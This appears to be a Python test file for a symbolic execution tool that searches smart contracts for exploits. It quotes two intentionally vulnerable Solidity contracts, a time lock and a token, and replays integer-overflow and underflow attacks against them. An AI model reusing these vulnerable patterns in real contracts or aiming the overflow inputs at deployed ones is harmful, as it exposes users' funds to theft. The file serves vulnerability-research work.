from speculative_machine_executor import SpeculativeMachineExecutor
from speculative_machine import SpeculativeMachine 
from z3 import BitVecVal
from utils import bytes_to_int, int_to_bytes, parse_solidity_abi_input, func_sig, \
    eth_to_wei, ready_hex, pad_bytes_to_address, uint_to_bytes, summarise_possible_end, \
    load_binary, bytes_to_uint
from speculative_machine_executor import calculate_results_for_machine
from datetime import datetime

# Timelock.sol
# contract TimeLock {
    
#     mapping(address => uint) public balances;
#     mapping(address => uint) public lockTime;
    
#     function deposit() public payable {
#         balances[msg.sender] += msg.value;
#         lockTime[msg.sender] = now + 1 weeks;
#     }
    
#     function increaseLockTime(uint _secondsToIncrease) public {
#         lockTime[msg.sender] += _secondsToIncrease;
#     }
    
#     function withdraw() public {
#         require(balances[msg.sender] > 0);
#         require(now > lockTime[msg.sender]);
#         msg.sender.transfer(balances[msg.sender]);
#         balances[msg.sender] = 0;
#     }
# }

def test_get_timelock_overflow_actually_works():
    program = load_binary('contracts/build/TimeLock.bin-runtime')
    machine = SpeculativeMachine(program=program, max_invocations=2, logging=False)

    starting_timestamp = int(datetime(2018, 1, 1).timestamp())

    locker = pad_bytes_to_address(b'XLOCKERX')

    machine.execute_deterministic_function(func_sig('deposit()'),
                                           call_value=eth_to_wei(5),
                                           timestamp=uint_to_bytes(starting_timestamp),
                                           sender=locker)
    machine.execute_deterministic_function(func_sig('increaseLockTime(uint256)'),
                                           args=[uint_to_bytes(2**256 - starting_timestamp - 5)],
                                           timestamp=uint_to_bytes(starting_timestamp+1),
                                           sender=locker)
    
    machine.execute_deterministic_function(func_sig('withdraw()'),
                                           timestamp=uint_to_bytes(starting_timestamp+1),
                                           sender=locker)

    assert machine.wallet_amounts[locker] == eth_to_wei(5)


def test_timelock_exploit():
    program = load_binary('contracts/build/TimeLock.bin-runtime')
    machine = SpeculativeMachine(program=program, max_invocations=2, logging=False)

    starting_timestamp = int(datetime(2018, 1, 1).timestamp())

    machine.execute_deterministic_function(func_sig('deposit()'),
                                           call_value=eth_to_wei(5),
                                           timestamp=uint_to_bytes(starting_timestamp),
                                           sender=machine.sender_address)


    week_in_seconds = 60 * 60 * 24 * 7
    acceptance_criteria = [
        machine.first_timestamp == starting_timestamp + 1,
        machine.first_timestamp + week_in_seconds > machine.last_timestamp,
        machine.attacker_wallet > machine.attacker_wallet_starting
    ]

    machine.pc = 0
    possible_ends = SpeculativeMachineExecutor(machine).possible_ends(acceptance_criteria=acceptance_criteria)

    summary = summarise_possible_end(possible_ends[0])
    import pdb; pdb.set_trace()
    assert summary['inputs'][0]['data']['func_info']['name'] == 'increaseLockTime(uint256)'
    assert summary['inputs'][0]['data']['args'][0]['val'] < 2 ** 256
    assert summary['inputs'][0]['data']['args'][0]['val'] > 2 ** 255

    assert summary['inputs'][1]['data']['func_info']['name'] == 'withdraw()'


# contract underflow_token {
#   mapping(address => uint) balances;
#   uint public totalSupply;
#   constructor(uint _initialSupply) public {
#     balances[msg.sender] = totalSupply = _initialSupply;
#   }
#   function transfer(address _to, uint _value) public returns (bool) {
#     require(balances[msg.sender] - _value >= 0);
#     balances[msg.sender] -= _value;
#     balances[_to] += _value;
#     return true;
#   }
#   function balanceOf(address _owner) public view returns (uint balance) {
#     return balances[_owner];
#   }
# }

def test_underflow_token_exploit_actually_works():
    program = load_binary('contracts/build/underflow_token.bin')

    constructor_address = pad_bytes_to_address(b'xConstructorx')
    machine = SpeculativeMachine(program=program, max_invocations=2, logging=False)
    machine.deploy(program, [uint_to_bytes(0)], sender=constructor_address)

    return_value = machine.execute_deterministic_function(func_sig('transfer(address,uint256)'),
                                                          args=[constructor_address, uint_to_bytes(123)],
                                                          sender=machine.sender_address)
    #import pdb; pdb.set_trace()

    return_value = machine.execute_deterministic_function(func_sig('balanceOf(address)'),
                                                          args=[constructor_address],
                                                          sender=machine.sender_address)
    assert bytes_to_uint(return_value.args[0]) == 123
